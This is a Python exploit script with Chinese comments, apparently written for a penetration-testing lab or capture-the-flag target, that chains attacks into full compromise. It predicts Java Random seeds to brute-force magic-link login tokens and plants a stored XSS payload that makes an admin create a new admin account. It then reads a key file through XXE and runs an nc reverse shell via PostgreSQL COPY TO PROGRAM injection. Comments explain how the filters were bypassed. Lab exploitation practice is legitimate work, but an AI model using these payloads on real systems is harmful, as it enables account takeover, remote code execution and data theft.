#!/usr/bin/env python3
"""
repro_with_java_random_pkg.py
使用第三方包 java-random 来复现 Java TokenUtil.createToken 的 token。
python -m pip install --user git+https://github.com/MostAwesomeDude/java-random
"""

import base64
import time
from javarandom import Random   # 来自 MostAwesomeDude/java-random 仓库
import requests
import urllib.parse
from bs4 import BeautifulSoup
import sys
import re

# 源代码中的Random类实现方法，由于Random不安全，在同一个时间Random 实例在同一毫秒内被创建时，
# 默认种子就是当前时间戳,同一个种子生成得随机数是一样的，那么就能爆破出token, 只要我们知道了token生成过程
CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz"
NUMBERS = "1234567890"
SYMBOLS = "!@#$%^&*()"
CHARSET = CHAR_LOWER + CHAR_LOWER.upper() + NUMBERS + SYMBOLS
TOKEN_LENGTH = 42
GENERATE_PATH = "/generateMagicLink" # 触发生成 token 的路径
MAGIC_LINK_PATH = "/magicLink/{}" # 使用 token 的路径
XSS_PATH = "/question"

# token生成器，由于知道了种子是System.currentTimeMillis()，并且用的Random类，输入爆破的种子值就是token
def create_token_using_java_random_pkg(seed:str, user_id: int):
    rnd = Random(int(seed))
    raw = ''.join([CHARSET[rnd.nextInt(len(CHARSET))] for _ in range(TOKEN_LENGTH)])
    raw_bytes = raw.encode('utf-8')
    # Java (byte)字节码位数不不同Java 字节(Byte) 取值范围 [-128,127]
    # Python3 字节(bytes) 取值范围： [0,256)
    # & 0x80 取最高位（第 7 位）
    # 任何整数 & 0xFF 都只保留最低 8 位
    key = user_id & 0xFF
    if key > 127: key -= 256
    encbytes = bytearray(len(raw_bytes))
    for i, b in enumerate(raw_bytes):
        encbytes[i] = (b ^ key) & 0xFF

    return base64.urlsafe_b64encode(encbytes).decode('ascii').rstrip('=')

# 暴力列出来2秒内所有的seed可以得到的token,建议用2000ms范围，1000ms总是失败
def brute_all_tokens(user_id: int, center_ms: int = None, radius_ms: int = 2_000):
    """把 center_ms ± radius_ms 内所有 token 全算出来"""
    if center_ms is None:
        center_ms = int(time.time() * 1000)

    print(f"中心时间 {center_ms} 前后 ±{radius_ms} ms 所有可能 token：")
    pairs = []
    for delta in range(-radius_ms, radius_ms + 1):
        seed = center_ms + delta
        tok = create_token_using_java_random_pkg(str(seed), user_id)
        pairs.append((seed, tok))

    return pairs

# 发送请求的函数token请求
def send_generate_magic_link(session: requests.Session, base_url: str, username: str):
    """
    POST /generateMagicLink 触发生成 token
    """
    url = urllib.parse.urljoin(base_url, GENERATE_PATH)
    data = {"username": username}
    resp = session.post(url, data=data, allow_redirects=False)
    return resp.status_code, resp.text

# 尝试token能不能用,如果返回报文里有Set-Cookie: session=xxx;，说明登录成功
def consume_magic_link(session: requests.Session, base_url: str, token: str):
    """
    GET /magicLink/{token} 使用 token 登录
    """
    path = MAGIC_LINK_PATH.format(urllib.parse.quote(token, safe=""))
    url = urllib.parse.urljoin(base_url, path)
    resp = session.get(url, allow_redirects=False)
    if resp.headers.get("Set-Cookie"):
        cookie = resp.headers.get("Set-Cookie")
        print("成功登录捕获cookie:", cookie)
        return cookie
    else:
        return

# 让管理员xss指定创建管理员用户，后台有过滤，但是仅对开头结尾做了tag过滤
# 有跨域限制，只能在当前域内操作,并且单双引号会被过滤，用String绕过和URLSearchParams，后端储存的t不是字符串是True输入的isAdmin属性要注意
# 很奇怪name:String.fromCharCode(98)会被拦截, 发现用数字创建的用户不能使用。最终尝试，发现``没有被拦截
# 这个可以
# a<script>fetch(`/admin/users/create`,{method:`POST`,body:new URLSearchParams({name:`Frank`,email:1,isAdmin:`True`})})</script>em>
def generate_xss_payload(session: requests.Session, base_url: str, new_admin:str):
    """
    POST /question 使用cookie的moderator权限用户发送帖子
    """
    payload = r"""
        a<script>fetch(`/admin/users/create`,{method:`POST`,body:new URLSearchParams({name:`%s`,email:1,isAdmin:`True`})})</script>em>
        """.strip() % new_admin
    url = urllib.parse.urljoin(base_url, XSS_PATH)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"title": "zzzzz", "description": f"{payload}", "category": "1"}
    resp = session.post(url, data=data, headers=headers, allow_redirects=False)
    return resp.status_code

def find_users(session: requests.Session, base_url: str, username: str):
    # 尝试捕捉创建的用户的user number是多少，后续用于继续爆破token
    for user_number in range(2,20):
        url = urllib.parse.urljoin(base_url, f'/profile/{user_number}')
        resp_content = session.get(url, allow_redirects=False).text
        soup = BeautifulSoup(resp_content, "html.parser")
        # 找到 <h2>创建的用户名</h2>
        user = soup.find("h2")
        if user and user.text == username:
            print(f"找到用户 {username}")
            return user_number
    print("本次循环未找到创建admin用户")
    return None

# 爆破token得到用户cookie的过程
def brute_for_user_access(base_url:str, username:str, uid:str, s:requests.Session):
    code, text = send_generate_magic_link(s, base_url, username)
    print("POST /generateMagicLink ->", code, text[:100])
    # 得到2 秒内所有可能token清单
    pairs = brute_all_tokens(uid)
    cookie = None
    # 逐个尝试 token
    print(f"正在尝试爆破当前用户{username} uid为{uid}得请求token") # 发送token申请
    for seed, tok in pairs:
        cookie = consume_magic_link(s, base_url, tok)
        if cookie:
            print("成功爆破出token，捕获cookie:", cookie)
            return True
    if not cookie:
        print("没有成功捕获token，请排除错误")
        sys.exit(1)

if __name__ == "__main__":
    base_url = "http://192.168.135.234:8888/"
    #有moderator权限的,需要手动去网页中的/profile/去翻，确认好可用用户
    username = "Carl"
    uid = 5 
    admin_username = "Fred" # 创建新用户名
    command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.232 4444 >/tmp/f"
    # PostgreSQL COPY FROM PROGRAM注入payload
    inj_payload = f"COPY (SELECT '') TO PROGRAM '{command}'; -- "

    with requests.Session() as s:
        # 首先触发后端生成 token,如果成功会更新session,获取编辑权限用户
        brute_for_user_access(base_url, username, uid, s)
        # 用编辑权限用户发XSS payload
        status_code = generate_xss_payload(s, base_url, admin_username)
        if status_code == 200:
            print(f"XSS已发送到question路径，等待admin点击创建用户{admin_username}，尝试获取admin是否创建成功")
            print("开始轮询查找用户是否被创建（最长等待5分钟，每10秒检查一次）")
            user_num = None
            for i in range(30):  # 5分钟/10秒=30次
                user_num = find_users(s, base_url, admin_username)
                if user_num:
                    print(f"成功找到创建的用户，id为{admin_username},进行创建admin用户token爆破")
                    brute_for_user_access(base_url, admin_username, user_num, s)
                    flag = s.get(urllib.parse.urljoin(base_url, "/admin/flag"), allow_redirects=False).text
                    print(f"获取第一个flag为{flag}")
                    # 通过外部实体注入(XXE)得到/home/student/adminkey.txt
                    xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE foo [
                        <!ELEMENT foo ANY >
                        <!ENTITY xxe SYSTEM "file:///home/student/adminkey.txt" >
                        ]>
                        <database>
                        <categories></categories>
                        <users></users>
                        <questions></questions>
                        <answers>
                        <answer><description>&xxe;</description><created>2025-09-26</created><ownerId>1</ownerId><questionId>1</questionId></answer>
                        </answers>
                        </database>
                        '''
                    preview_url = urllib.parse.urljoin(base_url, "/admin/import")
                    data = {"xmldata": xxe_payload, "preview": "true"}
                    print("尝试通过XXE注入获取adminkey.txt内容...")
                    resp = s.post(preview_url, data=data)

                    key_match = re.search(r"([0-9a-fA-F\-]{36})", resp.text)
                    if key_match:
                        admin_key = key_match.group(1)
                        print(f"成功通过XXE获取admin key: {admin_key}")
                        # 利用admin key访问/admin/query，进行PostgreSQL SQL注入命令执行反弹shell
                        query_url = urllib.parse.urljoin(base_url, "/admin/query")
                        data = {"adminKey": admin_key, "query": inj_payload}
                        print(f"尝试利用admin key进行SQL注入命令执行，payload: {inj_payload}")
                        resp2 = s.post(query_url, data=data)
                        print("/admin/query 响应：")
                        print(resp2.text)
                        sys.exit(1)
                    else:
                        print("未能通过XXE获取admin key，响应如下：")
                        print(resp.text)
                    sys.exit(1)
                else:
                    print(f"第{i+1}次未找到用户，等待10秒后重试...")
                    time.sleep(10)
            print(f"5分钟内未检测到管理员点击XSS payload，用户未被创建")
            sys.exit(1)
        else:
            print("XSS Payload发送失败")
            sys.exit(1)